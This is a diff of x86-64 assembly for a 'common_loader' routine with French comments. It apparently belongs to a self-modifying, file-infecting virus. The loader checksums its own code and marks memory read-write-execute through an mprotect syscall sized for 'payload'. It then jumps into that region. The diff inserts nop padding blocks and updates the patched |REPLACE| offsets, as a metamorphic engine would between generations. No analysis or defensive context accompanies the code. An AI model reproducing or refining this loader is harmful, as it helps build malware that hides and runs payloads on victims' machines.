@@ -16,6 +16,12 @@ common_loader:
 	push rbp ; push
 	mov rbp, rsp ; push
 	and rsp, 0xFFFFFFFFFFFFFFF0 ; push
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	push rdi ; push
 	push rsi ; push
 	push rax ; push
@@ -24,6 +30,12 @@ common_loader:
 	push rdx ; push
 	push r8 ; push
 	push r9 ; push
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	push r10 ; push
 	push r11 ; push
 	push r12 ; push
@@ -33,14 +45,20 @@ common_loader:
 	pushfq
 	mov edi, 5381
 	mov r13d, edi ;hash bis
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	mov rdx, 0xc5; c5 ;size LOADER a modifier
 	mov rsi, 0 ;inc
 	lea rcx, [loader] ;adresse syscalls
 	pop rax; verif step by step
 hash_loop1:
-	cmp rsi, 0x9d;|REPLACE3| ; a modifier debut pos adresse apres pos_rdi
+	cmp rsi, 0xb5;|REPLACE3| ; a modifier debut pos adresse apres pos_rdi
 	jl after_cmp
-	cmp rsi, 0xa1;|REPLACE4| a modifier fin pos adresse apres pos_rdi
+	cmp rsi, 0xb9;|REPLACE4| a modifier fin pos adresse apres pos_rdi
 	jle hash_loop2
 after_cmp:
 	shl edi, 5
@@ -53,12 +71,18 @@ after_cmp:
 hash_loop2:
 	inc rsi
 	inc rcx
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	cmp rax, 0x100; verif step by step
 	je last_instr_of_loader; verif step by step
 	cmp rsi, rdx
 	jl hash_loop1
 	mov rdx, 0x7 ;EXEC | READ | WRITE; syscalls
-	mov rsi, 0x5a36;|REPLACE1| size bis + payload + 1 page ; syscalls
+	mov rsi, 0x5a6e;|REPLACE1| size bis + payload + 1 page ; syscalls
 	lea rdi, [pos_rdi] ; adresse bis ; syscalls
 pos_rdi:
 	mov r14, 0x12345678
@@ -68,8 +92,14 @@ pos_rdi:
 	mov r15, rdi
 	and rdi, 0xFFFFFFFFFFFFF000 ; syscalls
 	mov rax, 0xa ; syscalls
+	nop
+	nop
+	nop ; placeholder
+	nop
+	nop
+	nop
 	syscall ; syscalls
-	add rbx, 0x44d;|REPLACE2| BIS_SIZE
+	add rbx, 0x49f;|REPLACE2| BIS_SIZE
 	jmp r15
 	index dd 0x41414141
 	lol db 0
